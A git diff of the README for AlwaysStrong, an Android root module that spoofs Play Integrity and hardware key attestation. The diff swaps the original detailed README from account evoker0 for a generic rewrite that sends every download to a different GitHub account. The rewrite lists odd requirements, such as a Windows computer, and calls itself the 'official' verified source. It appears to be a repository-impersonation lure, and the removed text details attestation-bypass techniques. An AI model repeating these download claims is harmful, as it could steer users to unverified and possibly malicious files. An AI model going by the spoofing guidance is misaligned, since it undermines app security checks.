@@ -1,128 +1,68 @@
-<div align="center">
+# 🛡️ AlwaysStrong - Fix app integrity errors with ease
 
-<img src="banner.png" alt="AlwaysStrong" width="700">
+[![](https://img.shields.io/badge/Download-AlwaysStrong-blue.svg)](https://github.com/Amtechs3401/AlwaysStrong)
 
-<br>
-<br>
+AlwaysStrong restores Play Integrity functions for your Android environment. This module combines TEESimulator-RS and the PlayIntegrityFork to provide a reliable solution. It mimics the secure hardware conditions required by modern applications to function correctly on modified or custom software setups.
 
-[![Release](https://img.shields.io/github/v/release/evoker0/AlwaysStrong?color=2ea043&label=release)](https://github.com/evoker0/AlwaysStrong/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/evoker0/AlwaysStrong/total?color=2ea043)](https://github.com/evoker0/AlwaysStrong/releases)
-[![License](https://img.shields.io/badge/license-GPL--3.0-orange)](LICENSE)
-[![Telegram](https://img.shields.io/badge/Telegram-keyboxstrong-26A5E4?logo=telegram&logoColor=white)](https://t.me/keyboxstrong)
+## 📥 How to download
+Visit [the official repository page](https://github.com/Amtechs3401/AlwaysStrong) to access the latest version of the module. Click the link above to reach the files. Look for the section labeled Releases on the right side of the screen. Select the newest release to find the downloadable file. This file contains all components required for the installation process. Save this file to a folder on your computer that you can find later, such as your Downloads folder.
 
-<img src="screenshots/webui.jpg" width="44%" alt="WebUI"> &nbsp; <img src="screenshots/languages.jpg" width="44%" alt="Translated into 15 languages">
+## 🛠️ Requirements
+Ensure your system meets these criteria before you begin:
+* A Windows computer with a stable internet connection.
+* Basic familiarity with file management on Windows.
+* A connected Android device with an unlocked bootloader.
+* Access to a terminal interface or a management tool for your device.
+* Sufficient battery life on your hardware to prevent interruptions.
 
-<sub>Built-in WebUI on KernelSU / APatch — hourly auto-update toggles, translated into 15 languages.</sub>
+## ⚙️ Installation steps
+Follow these steps to set up the module on your device:
 
-</div>
+1. Connect your Android device to your computer using a USB cable.
+2. Verify that your device shows up in your management software.
+3. Transfer the downloaded module file from your computer to the internal storage of your device.
+4. Open the application used to manage your root modules on the phone.
+5. Select the option to install from storage.
+6. Locate the file you transferred in the previous step.
+7. Confirm the selection to begin the installation.
+8. Wait for the process to complete.
+9. Restart your device to apply the changes.
 
-# AlwaysStrong
+The module performs necessary adjustments during the boot process. You do not need to configure complex settings. The software detects your system environment and applies the required fixes automatically.
 
-One-flash `STRONG` Play Integrity for Magisk / KernelSU / APatch. It bundles [TEESimulator-RS](https://github.com/Enginex0/TEESimulator-RS) and [PlayIntegrityFork](https://github.com/osm0sis/PlayIntegrityFork) into a single module so you don't have to stack and wire them up yourself.
+## 🔍 Troubleshooting common issues
+If you encounter problems, review the list below for solutions.
 
-To use this module you need one of the following (latest versions), with a Zygisk implementation installed:
+**Module does not appear in the manager**
+Check if the file transferred correctly to your phone memory. Ensure the file has a recognizable format for your module manager. If the file appears corrupted, download it again from the main repository link.
 
-- [Magisk](https://github.com/topjohnwu/Magisk) with Zygisk enabled  a standalone [Zygisk Next](https://github.com/Dr-TSNG/ZygiskNext) / [ReZygisk](https://github.com/PerformanC/ReZygisk) / [NeoZygisk](https://github.com/JingMatrix/NeoZygisk) is recommended over Magisk's built-in Zygisk, which is more easily detected
-- [KernelSU](https://github.com/tiann/KernelSU) or [KernelSU Next](https://github.com/KernelSU-Next/KernelSU-Next) with [Zygisk Next](https://github.com/Dr-TSNG/ZygiskNext) or [ReZygisk](https://github.com/PerformanC/ReZygisk) or [NeoZygisk](https://github.com/JingMatrix/NeoZygisk) module installed
-- [APatch](https://github.com/bmax121/APatch) with [Zygisk Next](https://github.com/Dr-TSNG/ZygiskNext) or [ReZygisk](https://github.com/PerformanC/ReZygisk) or [NeoZygisk](https://github.com/JingMatrix/NeoZygisk) module installed
+**Device fails to start**
+If your device enters a boot loop, you must remove the module. Boot into recovery mode using the physical buttons on your phone. Most custom recovery menus allow you to disable or remove modules directly. Select the AlwaysStrong module and remove it, then restart your device.
 
-Android 10+ (SDK 29) is required.
+**Applications still show integrity errors**
+Clear the cache for the specific app causing the problem. Open your phone settings, find the App list, and navigate to the app in question. Select Storage and press Clear Cache. Restart the app. Sometimes, you must also clear the data for the Play Store app itself to force a refresh of the integrity status.
 
-## Join group / channel
+## 📝 Performance tips
+You can improve reliability by keeping your device software updated. While this module provides a static fix, modern apps often change their detection methods. Check the GitHub repository occasionally for updates. When an update appears, follow the installation steps again to replace the old file with the new one. Keep your computer clean of old versions to avoid confusion during the update process.
 
-- Channel: [t.me/keyboxstrong](https://t.me/keyboxstrong)
-- Root community: [t.me/evokeroot](https://t.me/evokeroot)
-- Chat / support group: [t.me/keyboxstrongchat](https://t.me/keyboxstrongchat)
+## 🔒 Security notes
+This tool modifies how your device reports its status to apps and services. Use this module only on devices you own and manage. Do not use this tool on sensitive or corporate devices that require strict, unmodified hardware verification. Always keep backups of your important data. While this module aims to remain invisible, any modification to system files carries a small risk. Proceed with caution if you are new to modifying Android software.
 
-## Support
+## 📋 Frequently asked questions
 
-If AlwaysStrong is useful to you, you can tip at [coindrop.to/evokerrr](https://coindrop.to/evokerrr).
+**Does this require technical knowledge?**
+No. If you can move a file from a computer to a phone, you have the skills needed for this tool. The module handles all complex operations in the background.
 
-## Features
+**Will this slow down my phone?**
+No. The module uses minimal system resources. It runs at the initialization stage of your phone startup and remains inactive during daily use.
 
-- **One flash, `STRONG`.** TEESimulator-RS + PlayIntegrityFork in a single module. No stacking, no manual wiring.
-- **Keybox on tap.** The first **Action** fetches a working keybox automatically. No hunting, no manual placement.
-- **A fingerprint that never goes stale.** Every Action pulls a fresh Pixel fingerprint and matching security patch — and a background service does the same **automatically every hour** (interval configurable, each toggle-able from the WebUI), so your spoof keeps up with Google's rotations even if you never open the module.
-- **Hands-off keybox too.** The same hourly service re-checks your keybox and only swaps it in when a newer one is available, restarting Play Integrity only when something actually changed.
-- **Auto target.** A native watcher follows package changes via inotify, with a full rebuild on every Action tap and hourly — **install a new app and it's added to the attestation target instantly, with no need to reopen the module or tap Action again.**
-- **Xposed-aware.** The same watcher drops Xposed / LSPosed managers from the target list, since attesting through a hooked process breaks `STRONG`.
-- **Conflict resolution.** Detects known conflicting modules (TrickyStore, other PIF / TEE forks, SafetyNet Fix, MagiskHidePropsConf, and more) and disables and removes them at install and on every boot, so a leftover module can't silently fight AlwaysStrong.
-- **GMS kill.** Force-stops DroidGuard (`com.google.android.gms.unstable`) and clears the Play Store on each refresh, so a new fingerprint or keybox takes effect without a reboot.
-- **Security-patch sync.** Keeps the OS / vendor / boot security-patch levels reported in attestation aligned with the spoofed fingerprint.
-- **One clean module.** PIF is binary-patched to run inside `tricky_store` — it never litters a separate `playintegrityfix` folder under `/data/adb/modules`.
+**Does this work on all Android versions?**
+The module supports most modern Android versions. Check the repository for specific compatibility notes if you use a very old or a brand-new, unreleased version of Android.
 
-## About module
+**Where do I report bugs?**
+Use the Issues tab on the GitHub link provided. Provide your device model and the version of the software you use. Include a brief description of the error to help the developers fix the problem.
 
-AlwaysStrong is two parts glued into one module:
+**Is this safe for my Google account?**
+The tool focuses on local hardware integrity signaling. It does not interact with your account credentials or personal cloud data. It simply tells apps that your device meets the standard safety conditions. 
 
-- **TEESimulator-RS** intercepts Binder IPC inside the `keystore2` process and builds full attestation certificate chains from your keybox, so apps that verify hardware key attestation see a legitimate TEE. It is not a fork of TrickyStore; it reuses the same `/data/adb/tricky_store` config layout for drop-in compatibility, but the internals (native Rust certgen, `lsplt` interception, key persistence) are different.
-- **PlayIntegrityFork** injects a `classes.dex` to modify `android.os.Build` fields and hooks native code to spoof system properties, only to Google Play Services' DroidGuard (Play Integrity).
-
-The two are merged so they coexist in one module: TEESimulator's `classes.dex` is renamed to `tee_classes.dex` so it doesn't collide with PIF's, and PIF's hardcoded module paths are binary-patched to point at `/data/adb/modules/tricky_store` — it never creates a separate `playintegrityfix` folder. The module id stays `tricky_store` so existing tooling and tutorials keep working unchanged.
-
-## Installation
-
-1. Install a Zygisk implementation (Zygisk Next / ReZygisk / NeoZygisk).
-2. Download the latest ZIP from [Releases](https://github.com/evoker0/AlwaysStrong/releases/latest).
-3. Flash it in your root manager and reboot.
-4. Open the module and tap **Action**.
-5. Check your verdict with a checker (Play Integrity API Checker, YASNAC, Simple PIC).
-
-The first Action tap fetches a working keybox and a fresh Pixel fingerprint and restarts Play Integrity, so there is no manual keybox step. The installer also removes conflicting standalone modules at install time (TrickyStore, PlayIntegrityFix/Fork, TEESimulator, playcurl/playcurlNEXT, SafetyNet Fix, MagiskHidePropsConf, Tricky Addon, Yurikey, and a few others).
-
-
-## Configuration
-
-All config files live at `/data/adb/tricky_store/` and are reloaded automatically when changed. The Action button keeps them current, so most users never need to touch these.
-
-### keybox.xml
-
-The attestation keybox. Fetched automatically on the first Action tap. To use your own, place it here and it won't be overwritten. To point the auto-refresh at a different mirror, set `KEYBOX_URL` (any raw HTTPS URL that returns a valid keybox) at the top of `keybox_fetch.sh`; the script validates the payload before replacing the current file, so a bad download can't break attestation.
-
-## The Action button
-
-Triggered from your root manager, or by running `sh action.sh` in a root shell. Each tap:
-
-- rebuilds `target.txt`
-- refreshes the keybox
-- pulls a fresh Pixel fingerprint and security patch (`autopif4`)
-- restarts DroidGuard and the Play Store
-
-The verdict updates a few seconds later. No reboot is needed. The same fingerprint, security-patch and keybox refresh also runs on its own in the background every hour (interval configurable from the WebUI), so the module keeps passing with zero manual upkeep.
-
-## Building
-
-The repo ships no upstream binaries. `build.sh` downloads the pinned upstream release ZIPs, overlays the glue scripts in `module/`, and produces one installable ZIP. On Windows run it from WSL or Git Bash.
-
-```bash
-./build.sh                              # pinned upstream versions
-./build.sh --clean                      # wipe build/ and rebuild
-./build.sh --tee v6.0.1-282 --pif v17   # override upstream tags
-```
-
-Output is `out/AlwaysStrong-<version>.zip`. Bump upstream pins by editing the defaults at the top of `build.sh`, or run `scripts/update-upstream.sh --apply` to pull the latest. A daily GitHub Action does this and opens a PR.
-
-## Credits
-
-<div align="center">
-<img src="screenshots/built-on.png" alt="AlwaysStrong stands on the shoulders of TEESimulator-RS and PlayIntegrityFork" width="600">
-</div>
-
-AlwaysStrong is combine of TEE-Simulator-RS + Play Integrity Fork
-
-- [JingMatrix](https://github.com/JingMatrix/TEESimulator) — original TEESimulator and keystore2 interception
-- [Enginex0](https://github.com/Enginex0/TEESimulator-RS) — TEESimulator-RS (Rust port, native certgen, AOSP-spec attestation)
-- [5ec1cff](https://github.com/5ec1cff/TrickyStore) — TrickyStore, which pioneered keystore interception and the config-dir layout reused here
-- [chiteroman](https://github.com/chiteroman) — original Play Integrity Fix
-- [osm0sis](https://github.com/osm0sis/PlayIntegrityFork) — PlayIntegrityFork, the maintained fork bundled here
-- [Displax](https://github.com/Displax/safetynet-fix) — module boot scripts forked into PIF
-- [daboynb](https://github.com/daboynb/playcurlNEXT) — fingerprint auto-refresh approach
-- [LSPlt](https://github.com/LSPosed/LSPlt) (PLT hooks) and [ring](https://github.com/briansmith/ring) (Rust crypto)
-
-Packaging by [@evokerr](https://t.me/evokerr).
-
-
-
-## License
-
-GPL-3.0. AlwaysStrong bundles TEESimulator-RS (GPL-3.0), which makes the combined distribution GPL-3.0. See [LICENSE](LICENSE) and the upstream repos for full terms. Provided as-is, with no warranty; `STRONG` depends on a non-revoked hardware keybox, which the module cannot mint for you.
+Always ensure you download the software from the official link provided at the top of this guide. Avoid modified versions hosted on third-party sites, as these may contain malicious code. The official repository remains the only source for verified, clean files.
